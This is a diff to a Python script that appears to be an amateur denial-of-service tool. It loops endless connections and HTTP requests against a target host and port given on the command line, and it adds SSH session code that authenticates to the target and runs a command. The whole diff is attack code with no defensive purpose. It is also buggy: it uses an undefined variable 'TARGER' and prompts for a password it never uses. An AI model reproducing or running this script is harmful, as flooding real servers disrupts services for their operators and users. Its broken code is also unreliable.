@@ -2,11 +2,12 @@ import threading
 import socket
 import sys
 import ftplib
-# from ssh.session import Session
+from ssh2.session import Session
+import os
 
 args = sys.argv[1:]
-TARGET = (args[0].split('='))[1]
-PORT = int((args[1].split('='))[1])
+TARGET = args[0]
+PORT = int(args[1])
 Breach_count = 0
 
 def DOS_service(service):
@@ -29,7 +30,7 @@ def DOS_attack_HTTP():
         while True:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((TARGET, PORT))
-            print('http connected')
+            print(f'http connected on {TARGET} on PORT {PORT}')
             # HTTP exclusive msg sending
             s.sendto(("GET /" + TARGET + " HTTP/1.1\r\n").encode('ascii'), (TARGET, PORT))
             s.sendto(("Host: " + TARGET + "\r\n\r\n").encode('ascii'), (TARGET, PORT))
@@ -43,13 +44,25 @@ def DOS_attack_HTTP():
         print(e)
 
 def DOS_attack_SSH():
+    host = TARGET
+    password = input('enter password > ')
+    usr = os.getlogin()
     try:
         while True:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((TARGET, PORT))
-            print('ssh connected')
+            print(f'ssh connected: {TARGER} on PORT {PORT}')
             # SSH exclusive msg sending
-            
+            session = Session()
+            session.handshake(s)
+            session.agent_auth(usr)
+
+            try:
+                channel = session.open_session()
+                channel.execute('echo hello;')
+                channel.close()
+            except:
+                pass
 
             global Breach_count
             Breach_count += 1
@@ -64,7 +77,7 @@ def DOS_attack_FTP():
         while True:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((TARGET, PORT))
-            print('ssh connected')
+            print(f'FTP connected on {TARGET} on PORT {PORT}')
             # SSH exclusive msg sending
             
 
@@ -81,5 +94,6 @@ def DOS_attack_FTP():
 #         thread = threading.Thread(target=DOS_service, args=PORT)
 #         thread.start()
 
+# if importing this module
 if __name__ == '__main__':
     DOS_service(PORT)
